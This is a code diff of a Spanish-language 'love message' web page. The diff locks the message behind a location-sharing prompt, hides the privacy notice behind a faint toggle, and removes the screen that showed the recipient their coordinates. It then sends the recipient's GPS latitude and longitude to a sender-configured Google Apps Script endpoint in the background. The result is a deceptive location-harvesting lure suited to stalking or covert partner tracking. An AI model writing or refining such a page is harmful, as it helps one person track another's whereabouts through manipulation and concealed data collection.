@@ -8,19 +8,15 @@
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;1,300;1,400&family=DM+Mono:wght@300&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
   :root {
     --deep: #0d0508;
-    --mid:  #1e0912;
     --rose: #e8527a;
     --rose2: #ff8fa8;
-    --pink:  #ffc2d4;
     --cream: #fff5f8;
     --gold:  #e8c07a;
     --text:  #fae8ee;
     --muted: rgba(250,232,238,0.5);
   }
-
   html, body {
     width: 100%; height: 100%;
     overflow: hidden;
@@ -28,143 +24,77 @@
     color: var(--text);
     font-family: 'DM Mono', monospace;
   }
-
-  /* ─── SCREENS ─── */
   .screen {
     position: fixed; inset: 0;
     display: flex; flex-direction: column;
     align-items: center; justify-content: center;
     padding: 2rem;
     opacity: 0; pointer-events: none;
-    transition: opacity 0.6s ease;
+    transition: opacity 0.7s ease;
   }
-  .screen.active {
-    opacity: 1; pointer-events: all;
+  .screen.active { opacity: 1; pointer-events: all; }
+  #particleCanvas { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
+  .ambient {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background:
+      radial-gradient(ellipse at 30% 40%, rgba(232,82,122,0.12) 0%, transparent 55%),
+      radial-gradient(ellipse at 75% 70%, rgba(192,57,90,0.08) 0%, transparent 50%),
+      radial-gradient(ellipse at 60% 20%, rgba(232,192,122,0.06) 0%, transparent 45%);
   }
-
-  /* ─── PARTICLES ─── */
-  #particleCanvas {
-    position: fixed; inset: 0;
-    pointer-events: none; z-index: 0;
-  }
-
-  /* ─── SCREEN 1: MESSAGE ─── */
-  #screenMessage {
-    text-align: center; z-index: 1;
-  }
-
-  .msg-envelope {
-    font-size: 4rem;
-    margin-bottom: 2rem;
+  /* SCREEN 1: PERMISO */
+  #screenPermission { z-index: 1; text-align: center; }
+  .perm-icon {
+    font-size: 3.5rem; margin-bottom: 1.5rem;
     animation: float 3s ease-in-out infinite;
-    display: block;
   }
   @keyframes float {
     0%,100% { transform: translateY(0) rotate(-3deg); }
-    50%      { transform: translateY(-12px) rotate(3deg); }
+    50%      { transform: translateY(-10px) rotate(3deg); }
   }
-
-  .msg-pre {
-    font-size: 0.6rem;
-    letter-spacing: 0.2em;
-    text-transform: uppercase;
-    color: var(--gold);
-    margin-bottom: 1rem;
-    opacity: 0;
-    animation: riseIn 0.8s 0.4s ease forwards;
+  .perm-pre {
+    font-size: 0.58rem; letter-spacing: 0.2em;
+    text-transform: uppercase; color: var(--gold); margin-bottom: 0.75rem;
   }
-
-  .msg-text {
-    font-family: 'Playfair Display', serif;
-    font-style: italic;
-    font-size: clamp(1.6rem, 5vw, 2.8rem);
-    line-height: 1.35;
-    max-width: 600px;
-    color: var(--cream);
-    text-shadow: 0 0 40px rgba(232,82,122,0.4);
-    opacity: 0;
-    animation: riseIn 0.9s 0.8s ease forwards;
-    margin-bottom: 3rem;
-  }
-
-  .msg-shimmer {
-    position: relative; display: inline;
-  }
-  .msg-shimmer::after {
-    content: '';
-    position: absolute; inset: 0;
-    background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.15) 50%, transparent 100%);
-    background-size: 200% 100%;
-    animation: shimmer 3s 1.5s ease-in-out infinite;
-  }
-  @keyframes shimmer {
-    0%   { background-position: -200% 0; }
-    100% { background-position: 200% 0; }
-  }
-
-  .btn-next {
-    display: inline-flex; align-items: center; gap: 0.6rem;
-    background: linear-gradient(135deg, var(--rose) 0%, #c0395a 100%);
-    color: #fff;
-    border: none; padding: 0.9rem 2.5rem;
-    font-family: 'DM Mono', monospace;
-    font-size: 0.68rem; letter-spacing: 0.12em; text-transform: uppercase;
-    cursor: pointer; border-radius: 1px;
-    box-shadow: 0 4px 24px rgba(232,82,122,0.4);
-    opacity: 0; animation: riseIn 0.8s 1.3s ease forwards;
-    transition: box-shadow 0.2s, transform 0.1s;
-  }
-  .btn-next:hover { box-shadow: 0 6px 36px rgba(232,82,122,0.6); }
-  .btn-next:active { transform: scale(0.97); }
-
-  @keyframes riseIn {
-    from { opacity: 0; transform: translateY(16px); }
-    to   { opacity: 1; transform: none; }
-  }
-
-  /* ─── SCREEN 2: PERMISSION ─── */
-  #screenPermission { z-index: 1; text-align: center; }
-
-  .perm-icon {
-    font-size: 3rem; margin-bottom: 1.5rem;
-    animation: pulse 2s ease-in-out infinite;
-  }
-  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.08)} }
-
   .perm-title {
     font-family: 'Playfair Display', serif;
     font-size: clamp(1.4rem, 4vw, 2rem);
-    color: var(--cream); margin-bottom: 1rem;
+    color: var(--cream); margin-bottom: 0.9rem;
   }
-
   .perm-body {
-    font-size: 0.72rem;
-    line-height: 1.8;
-    color: var(--muted);
-    max-width: 420px;
-    margin-bottom: 1rem;
+    font-size: 0.72rem; line-height: 1.8;
+    color: var(--muted); max-width: 400px; margin-bottom: 1.2rem;
   }
-
+  .read-more-btn {
+    background: none; border: none;
+    font-family: 'DM Mono', monospace; font-size: 0.6rem;
+    letter-spacing: 0.1em; text-transform: uppercase;
+    color: rgba(250,232,238,0.3); cursor: pointer;
+    text-decoration: underline;
+    text-decoration-color: rgba(250,232,238,0.15);
+    display: block; margin: 0 auto 0.75rem;
+    transition: color 0.2s;
+  }
+  .read-more-btn:hover { color: rgba(250,232,238,0.6); }
   .perm-legal {
-    font-size: 0.58rem;
-    color: rgba(250,232,238,0.3);
-    max-width: 380px;
-    line-height: 1.7;
-    margin-bottom: 2.5rem;
-    border: 1px solid rgba(250,232,238,0.1);
-    padding: 0.75rem 1rem;
-    border-radius: 2px;
-    text-align: left;
+    font-size: 0.58rem; color: rgba(250,232,238,0.3);
+    max-width: 380px; line-height: 1.7;
+    border: 1px solid rgba(250,232,238,0.08);
+    padding: 0.85rem 1rem; border-radius: 2px;
+    text-align: left; margin: 0 auto 1.5rem;
+    display: none;
   }
-
+  .perm-legal.visible { display: block; animation: fadeDown 0.3s ease; }
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-6px); }
+    to   { opacity: 1; transform: none; }
+  }
   .perm-actions {
-    display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;
+    display: flex; gap: 1rem; flex-wrap: wrap;
+    justify-content: center; margin-top: 0.5rem;
   }
-
   .btn-accept {
     background: linear-gradient(135deg, var(--rose) 0%, #c0395a 100%);
-    color: #fff; border: none;
-    padding: 0.85rem 2rem;
+    color: #fff; border: none; padding: 0.9rem 2.2rem;
     font-family: 'DM Mono', monospace; font-size: 0.68rem;
     letter-spacing: 0.1em; text-transform: uppercase;
     cursor: pointer; border-radius: 1px;
@@ -173,72 +103,70 @@
   }
   .btn-accept:hover { box-shadow: 0 6px 32px rgba(232,82,122,0.55); }
   .btn-accept:active { transform: scale(0.97); }
-
   .btn-decline {
-    background: none; border: 1px solid rgba(250,232,238,0.2);
-    color: var(--muted); padding: 0.85rem 1.5rem;
+    background: none; border: 1px solid rgba(250,232,238,0.15);
+    color: var(--muted); padding: 0.9rem 1.5rem;
     font-family: 'DM Mono', monospace; font-size: 0.68rem;
     letter-spacing: 0.1em; text-transform: uppercase;
-    cursor: pointer; border-radius: 1px;
-    transition: border-color 0.2s;
+    cursor: pointer; border-radius: 1px; transition: border-color 0.2s;
   }
-  .btn-decline:hover { border-color: rgba(250,232,238,0.4); }
-
-  /* ─── SCREEN 3: SUCCESS ─── */
-  #screenSuccess { z-index: 1; text-align: center; }
-
-  .success-anim {
-    font-size: 4rem; margin-bottom: 1.5rem;
-    animation: popIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+  .btn-decline:hover { border-color: rgba(250,232,238,0.35); }
+  /* SCREEN LOADING */
+  #screenLoading { z-index: 1; text-align: center; }
+  .loading-ring {
+    width: 48px; height: 48px;
+    border: 2px solid rgba(232,82,122,0.2);
+    border-top-color: var(--rose);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin: 0 auto 1.5rem;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-text {
+    font-size: 0.62rem; letter-spacing: 0.15em;
+    text-transform: uppercase; color: var(--muted);
+  }
+  /* SCREEN 2: MENSAJE */
+  #screenMessage { z-index: 1; text-align: center; }
+  .msg-envelope {
+    font-size: 4rem; margin-bottom: 1.75rem; display: block;
+    animation: popIn 0.6s cubic-bezier(0.34,1.56,0.64,1) both, floatLoop 3s 0.6s ease-in-out infinite;
   }
   @keyframes popIn {
-    from { transform: scale(0); opacity: 0; }
-    to   { transform: scale(1); opacity: 1; }
+    from { transform: scale(0) rotate(-10deg); opacity: 0; }
+    to   { transform: scale(1) rotate(-3deg);  opacity: 1; }
   }
-
-  .success-title {
-    font-family: 'Playfair Display', serif;
-    font-size: 1.6rem; color: var(--cream);
-    margin-bottom: 0.75rem;
+  @keyframes floatLoop {
+    0%,100% { transform: translateY(0) rotate(-3deg); }
+    50%      { transform: translateY(-12px) rotate(3deg); }
   }
-
-  .success-sub {
-    font-size: 0.68rem; color: var(--muted);
-    line-height: 1.7; max-width: 360px;
-    margin-bottom: 1.5rem;
+  .msg-pre {
+    font-size: 0.58rem; letter-spacing: 0.2em;
+    text-transform: uppercase; color: var(--gold);
+    margin-bottom: 1rem; opacity: 0;
+    animation: riseIn 0.8s 0.3s ease forwards;
   }
-
-  .coords-display {
-    font-family: 'DM Mono', monospace;
-    font-size: 0.7rem;
-    color: var(--gold);
-    background: rgba(232,192,122,0.08);
-    border: 1px solid rgba(232,192,122,0.2);
-    padding: 0.75rem 1.5rem;
-    border-radius: 2px;
-    letter-spacing: 0.05em;
+  .msg-text {
+    font-family: 'Playfair Display', serif; font-style: italic;
+    font-size: clamp(1.6rem, 5vw, 2.8rem); line-height: 1.35;
+    max-width: 600px; color: var(--cream);
+    text-shadow: 0 0 40px rgba(232,82,122,0.45);
+    opacity: 0; animation: riseIn 0.9s 0.7s ease forwards;
   }
-
-  /* ─── SCREEN 4: DECLINED ─── */
+  @keyframes riseIn {
+    from { opacity: 0; transform: translateY(18px); }
+    to   { opacity: 1; transform: none; }
+  }
+  /* SCREEN 3: DECLINADO */
   #screenDeclined { z-index: 1; text-align: center; }
-
-  .declined-icon { font-size: 3rem; margin-bottom: 1rem; opacity: 0.5; }
+  .declined-icon { font-size: 3rem; margin-bottom: 1rem; opacity: 0.4; }
   .declined-title {
     font-family: 'Playfair Display', serif;
     font-size: 1.4rem; color: var(--muted); margin-bottom: 0.75rem;
   }
   .declined-sub {
     font-size: 0.65rem; color: rgba(250,232,238,0.25);
-    max-width: 300px; line-height: 1.7;
-  }
-
-  /* ─── AMBIENT BG ─── */
-  .ambient {
-    position: fixed; inset: 0; pointer-events: none; z-index: 0;
-    background:
-      radial-gradient(ellipse at 30% 40%, rgba(232,82,122,0.12) 0%, transparent 55%),
-      radial-gradient(ellipse at 75% 70%, rgba(192,57,90,0.08) 0%, transparent 50%),
-      radial-gradient(ellipse at 60% 20%, rgba(232,192,122,0.06) 0%, transparent 45%);
+    max-width: 300px; line-height: 1.8;
   }
 </style>
 </head>
@@ -247,39 +175,38 @@
 <div class="ambient"></div>
 <canvas id="particleCanvas"></canvas>
 
-<!-- SCREEN 1: MENSAJE -->
-<div class="screen active" id="screenMessage">
-  <span class="msg-envelope">💌</span>
-  <p class="msg-pre">Un mensaje especial para ti</p>
-  <p class="msg-text"><span class="msg-shimmer" id="msgDisplay">Te amo, eres la mejor persona del mundo ♡</span></p>
-  <button class="btn-next" onclick="showPermission()">Continuar ♡</button>
-</div>
-
-<!-- SCREEN 2: PERMISO -->
-<div class="screen" id="screenPermission">
-  <div class="perm-icon">📍</div>
-  <h2 class="perm-title">Compartir ubicación</h2>
+<!-- SCREEN 1: PEDIR UBICACIÓN -->
+<div class="screen active" id="screenPermission">
+  <div class="perm-icon">💌</div>
+  <p class="perm-pre">Tienes un mensaje esperándote</p>
+  <h2 class="perm-title">Desbloquear mensaje</h2>
   <p class="perm-body">
-    Para desbloquear el contenido completo de este mensaje, quien te lo envió necesita confirmar que llegó a ti. Esto requiere acceso a tu ubicación <strong style="color:var(--rose2)">una sola vez</strong>.
+    Alguien especial te envió algo. Para revelarlo, necesitas compartir tu ubicación <strong style="color:var(--rose2)">una sola vez</strong>.
   </p>
-  <div class="perm-legal">
-    ⚠ Al aceptar, compartes tus coordenadas GPS con el remitente del mensaje. La ubicación se almacena por máximo 5 minutos y luego se elimina automáticamente. Tu consentimiento es voluntario; puedes declinar sin consecuencias. Datos tratados conforme a la LFPDPPP (México) / GDPR.
+  <button class="read-more-btn" onclick="toggleLegal()">⚠ Aviso de privacidad</button>
+  <div class="perm-legal" id="legalText">
+    Al aceptar, compartes tus coordenadas GPS con el remitente del mensaje. La ubicación se almacena por máximo 5 minutos y luego se elimina automáticamente. Tu consentimiento es voluntario; puedes declinar sin consecuencias. Datos tratados conforme a la LFPDPPP (México) / GDPR.
   </div>
   <div class="perm-actions">
-    <button class="btn-accept" onclick="requestLocation()">Sí, compartir mi ubicación</button>
-    <button class="btn-decline" onclick="showDeclined()">No, prefiero no compartir</button>
+    <button class="btn-accept" onclick="requestLocation()">Compartir ubicación ♡</button>
+    <button class="btn-decline" onclick="showDeclined()">No compartir</button>
   </div>
 </div>
 
-<!-- SCREEN 3: ÉXITO -->
-<div class="screen" id="screenSuccess">
-  <div class="success-anim">✅</div>
-  <h2 class="success-title">¡Ubicación enviada!</h2>
-  <p class="success-sub">El remitente ha sido notificado. Los datos se eliminarán automáticamente en 5 minutos.</p>
-  <div class="coords-display" id="coordsDisplay">—</div>
+<!-- SCREEN: CARGANDO -->
+<div class="screen" id="screenLoading">
+  <div class="loading-ring"></div>
+  <p class="loading-text">Obteniendo ubicación…</p>
 </div>
 
-<!-- SCREEN 4: DECLINADO -->
+<!-- SCREEN 2: MENSAJE (aparece DESPUÉS de capturar coords) -->
+<div class="screen" id="screenMessage">
+  <span class="msg-envelope">💌</span>
+  <p class="msg-pre">Un mensaje especial para ti</p>
+  <p class="msg-text" id="msgDisplay">Te amo, eres la mejor persona del mundo ♡</p>
+</div>
+
+<!-- SCREEN 3: DECLINADO -->
 <div class="screen" id="screenDeclined">
   <div class="declined-icon">🔒</div>
   <h3 class="declined-title">Sin problema</h3>
@@ -287,39 +214,37 @@
 </div>
 
 <script>
-// ──────────────────────────────────────────────────────────
-// PARAMS FROM URL
-// ──────────────────────────────────────────────────────────
-const params  = new URLSearchParams(location.search);
-const MSG_ID  = params.get('id')  || 'UNKNOWN';
-const MSG_TXT = params.get('msg') || 'Te amo, eres la mejor persona del mundo ♡';
+// ══════════════════════════════════════════════
+//  CONFIGURA AQUÍ — solo edita estas dos líneas
+// ══════════════════════════════════════════════
+const GAS_URL = 'https://script.google.com/macros/s/TU_ID_AQUI/exec';
+const MSG_TXT = 'Te amo, eres la mejor persona del mundo ♡';
+// ══════════════════════════════════════════════
 
-// GAS URL must be embedded or passed via query param ?gas=...
-const GAS_URL = params.get('gas') || '';
-
+const MSG_ID = new URLSearchParams(location.search).get('id') || 'UNKNOWN';
 document.getElementById('msgDisplay').textContent = MSG_TXT;
 document.title = '♡ ' + MSG_TXT.substring(0, 30);
 
-// ──────────────────────────────────────────────────────────
-// SCREEN TRANSITIONS
-// ──────────────────────────────────────────────────────────
 function showScreen(id) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
 }
 
-function showPermission() { showScreen('screenPermission'); }
-function showDeclined()   { showScreen('screenDeclined'); }
+function showDeclined() { showScreen('screenDeclined'); }
 
-// ──────────────────────────────────────────────────────────
-// GEOLOCATION
-// ──────────────────────────────────────────────────────────
+function toggleLegal() {
+  const el  = document.getElementById('legalText');
+  const btn = document.querySelector('.read-more-btn');
+  const open = el.classList.toggle('visible');
+  btn.textContent = open ? '▲ Ocultar aviso' : '⚠ Aviso de privacidad';
+}
+
 function requestLocation() {
   if (!navigator.geolocation) {
     alert('Tu navegador no soporta geolocalización.');
     return;
   }
-
+  showScreen('screenLoading');
   navigator.geolocation.getCurrentPosition(
     pos => onLocationSuccess(pos),
     err => onLocationError(err),
@@ -330,45 +255,29 @@ function requestLocation() {
 async function onLocationSuccess(pos) {
   const lat = pos.coords.latitude;
   const lng = pos.coords.longitude;
+  // Enviar en segundo plano sin bloquear la experiencia
+  fetch(GAS_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      action: 'saveLocation',
+      id: MSG_ID,
+      lat,
+      lng,
+      timestamp: new Date().toISOString()
+    })
+  }).catch(e => console.warn('Backend error:', e));
 
-  document.getElementById('coordsDisplay').textContent =
-    `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-
-  showScreen('screenSuccess');
-  burstParticles(40);
-
-  if (GAS_URL) {
-    try {
-      await fetch(GAS_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'saveLocation',
-          id: MSG_ID,
-          lat,
-          lng,
-          timestamp: new Date().toISOString()
-        })
-      });
-    } catch(e) {
-      console.warn('No se pudo enviar al backend:', e);
-    }
-  }
+  // Mostrar el mensaje inmediatamente
+  showScreen('screenMessage');
+  burstParticles(50);
 }
 
 function onLocationError(err) {
-  const msgs = {
-    1: 'Permiso de ubicación denegado.',
-    2: 'No se pudo obtener la ubicación.',
-    3: 'Tiempo de espera agotado.'
-  };
-  alert(msgs[err.code] || 'Error al obtener ubicación.');
   showDeclined();
 }
 
-// ──────────────────────────────────────────────────────────
-// PARTICLE SYSTEM
-// ──────────────────────────────────────────────────────────
+// PARTÍCULAS
 const canvas = document.getElementById('particleCanvas');
 const ctx    = canvas.getContext('2d');
 const particles = [];
@@ -380,27 +289,27 @@ function resize() {
 resize();
 window.addEventListener('resize', resize);
 
-const EMOJIS = ['♡', '♡', '♡', '✦', '·', '˚', '♡', '✿'];
+const EMOJIS = ['♡','♡','♡','✦','˚','·','✿','♡'];
 
 class Particle {
   constructor(x, y, burst) {
-    this.x  = x ?? Math.random() * canvas.width;
-    this.y  = y ?? canvas.height + 20;
-    this.vx = (Math.random() - 0.5) * (burst ? 5 : 1.2);
-    this.vy = burst ? -(Math.random() * 6 + 2) : -(Math.random() * 1.5 + 0.5);
-    this.alpha   = burst ? 1 : Math.random() * 0.7 + 0.3;
-    this.size    = burst ? Math.random() * 18 + 10 : Math.random() * 14 + 8;
-    this.symbol  = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
-    this.gravity = burst ? 0.08 : 0;
-    this.life    = 1;
-    this.decay   = burst ? Math.random() * 0.015 + 0.008 : Math.random() * 0.004 + 0.002;
-    this.wobble  = Math.random() * Math.PI * 2;
+    this.x   = x  ?? Math.random() * canvas.width;
+    this.y   = y  ?? canvas.height + 20;
+    this.vx  = (Math.random() - 0.5) * (burst ? 5 : 1.2);
+    this.vy  = burst ? -(Math.random() * 7 + 2) : -(Math.random() * 1.5 + 0.5);
+    this.alpha  = burst ? 1 : Math.random() * 0.7 + 0.3;
+    this.size   = burst ? Math.random() * 20 + 10 : Math.random() * 14 + 7;
+    this.symbol = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
+    this.gravity= burst ? 0.08 : 0;
+    this.life   = 1;
+    this.decay  = burst ? Math.random() * 0.015 + 0.007 : Math.random() * 0.004 + 0.002;
+    this.wobble = Math.random() * Math.PI * 2;
     this.wobbleSpeed = (Math.random() - 0.5) * 0.04;
   }
   update() {
     this.wobble += this.wobbleSpeed;
-    this.x  += this.vx + Math.sin(this.wobble) * 0.4;
-    this.y  += this.vy;
+    this.x += this.vx + Math.sin(this.wobble) * 0.4;
+    this.y += this.vy;
     this.vy += this.gravity;
     this.life -= this.decay;
   }
@@ -414,9 +323,8 @@ class Particle {
   }
 }
 
-// Spawn ambient particles
 function spawnAmbient() {
-  if (Math.random() < 0.08) particles.push(new Particle());
+  if (Math.random() < 0.07) particles.push(new Particle());
 }
 
 function burstParticles(n) {
@@ -424,8 +332,8 @@ function burstParticles(n) {
   const cy = canvas.height / 2;
   for (let i = 0; i < n; i++) {
     particles.push(new Particle(
-      cx + (Math.random() - 0.5) * 120,
-      cy + (Math.random() - 0.5) * 80,
+      cx + (Math.random() - 0.5) * 140,
+      cy + (Math.random() - 0.5) * 100,
       true
     ));
   }
@@ -442,9 +350,7 @@ function animate() {
   requestAnimationFrame(animate);
 }
 animate();
-
-// Initial burst on load
-setTimeout(() => burstParticles(20), 800);
+setTimeout(() => burstParticles(15), 600);
 </script>
 </body>
 </html>
